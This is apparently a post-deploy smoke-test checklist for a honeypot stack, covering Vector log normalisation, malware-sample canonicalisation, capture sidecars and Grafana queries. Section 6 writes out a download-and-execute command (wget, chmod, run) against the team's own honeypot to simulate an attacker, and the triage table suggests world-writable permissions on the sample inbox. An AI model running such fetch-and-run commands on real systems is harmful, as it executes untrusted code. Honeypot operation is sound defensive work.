# Smoke test — sample/log convention + normalised events

Post-deploy checklist for verifying the convention rework (shared inbox, canonicalising
metadata addon, per-honeypot capture sidecars, normalised `{job="events"}` stream).

Run against a honeypot server that's already provisioned. If the server hasn't been
provisioned yet, use `python honey.py provision --server <name>` instead of redeploy.

## 1. Redeploy

```
python honey.py redeploy --server <honeypot-server>
```

Should rsync the new files (capture-writer dir, updated composes, new vector.toml,
rewritten metadata.py, etc.), build the capture-writer + any other locally-built images
in sequence, and `docker compose up -d`.

Pass criteria: command exits 0.

## 2. Vector starts and accepts the VRL

VRL syntax errors are the most likely failure here. Vector refuses to start with a
clear line/column on bad VRL.

```bash
# On the honeypot server
docker compose -f /opt/<server>/docker-compose.yml logs -f vector
```

Expected:
- No `failed to build transform` errors mentioning `cowrie_events` / `mysql_events` /
  `dionaea_events`.
- Lines like `Vector has started` or component health logs.

Fail mode: VRL compile error names the bad transform and the line in `source = '''…'''`.
Fix by editing the offending honeypot's `vector.toml` and `redeploy`.

## 3. Metadata addon canonicalises samples

```bash
docker compose -f /opt/<server>/docker-compose.yml logs -f metadata
```

Expected on startup:
```
metadata addon started  inbox=/inbox  poll=2s  settle=5s
```

When a honeypot drops a binary (wait for real attacker traffic, or trigger one — see
§6), expect within ~5 seconds:
```
canonicalised abc123def456  from=cowrie/abc123def456...  src=1.2.3.4
```

Verify the canonical layout on disk:
```bash
ls /opt/<server>/inbox/                # should contain <sha256> + <sha256>.meta.json
ls /opt/<server>/inbox/cowrie/         # should be empty after canonicalisation
cat /opt/<server>/inbox/<sha256>.meta.json | jq .
```

Expected sidecar fields: `sha256, size, filetype, honeypot, original_name,
captured_at, processed_at, src_ip, url, session_id`. For cowrie-sourced samples,
`src_ip`/`url`/`session_id` should be populated. For dionaea, they'll be `null`.

## 4. Cowrie capture-writer is writing sidecars

```bash
docker compose -f /opt/<server>/docker-compose.yml logs -f capture-writer
```

Expected on startup:
```
capture-writer started  log=/cowrie-logs/cowrie.json  samples=/samples
```

On each download event:
```
capture  abc123def456...  src=1.2.3.4
```

If the writer logs nothing for an attacker download, check that `cowrie.json` is being
written to `/opt/<server>/cowrie/volumes/logs/cowrie.json` (the new convention path)
and the file is non-empty.

## 5. Grafana — both streams flowing

In Grafana (`http://<log-stack-tailscale-ip>:3000`):

| Query | Expected |
|---|---|
| `{job="cowrie"}` | raw cowrie events, unchanged from before |
| `{job="mysql"}` | raw mysql events |
| `{job="dionaea"}` | raw dionaea events |
| `{job="events"}` | normalised events from every honeypot on this server |
| `{job="events", honeypot="cowrie"}` | normalised cowrie events only |
| `{job="events"} | json | event_type = "login"` | logins across all honeypots |

Each normalised event should be a JSON object with `timestamp, honeypot, protocol,
src_ip, src_port, session_id, event_type, username, password, payload, sample_sha256`.

Sanity check: `{job="cowrie"}` and `{job="events", honeypot="cowrie"}` should have
roughly the same volume — the events stream drops unmapped `eventid`s (e.g.
`cowrie.client.version`) but the high-volume ones (`login`, `command`) are kept.

## 6. (Optional) Trigger sample capture without waiting for attackers

```bash
# From a machine with Tailscale, against the honeypot's public IP
ssh root@<honeypot-public-ip> 'wget http://example.com/binary && chmod +x binary && ./binary'
# password: anything (cowrie accepts)
```

This produces a `cowrie.session.file_download` event, which exercises:
- cowrie writes the binary to `/samples`
- capture-writer writes the `.capture.json` sidecar
- metadata canonicalises and writes the enriched sidecar
- malware-sender (if deployed) submits to the catalog

Watch `docker compose logs -f` on metadata + capture-writer simultaneously to see the
handoff in real time.

## Quick failure triage

| Symptom | Likely cause |
|---|---|
| `vector` container in restart loop | VRL syntax error — `docker compose logs vector` shows line:col |
| `metadata` logs `error  <hp>/<name>: ...` | filesystem permission — verify `/opt/<server>/inbox/<hp>/` is `chmod 777` |
| Canonical sidecar has `src_ip: null` for cowrie | capture-writer didn't keep up — check its logs, may need to bump `MTIME_SETTLE_SECS` |
| `get_logs.py` reports "log file may not exist yet" | log file isn't at convention path — confirm honeypot wrote `./volumes/logs/<hp>.json` |
| `{job="events"}` has no data but `{job="cowrie"}` does | event_type mapping table didn't match any raw `eventid` — check the per-honeypot mapping in `honey-pots/<hp>/CLAUDE.md` |
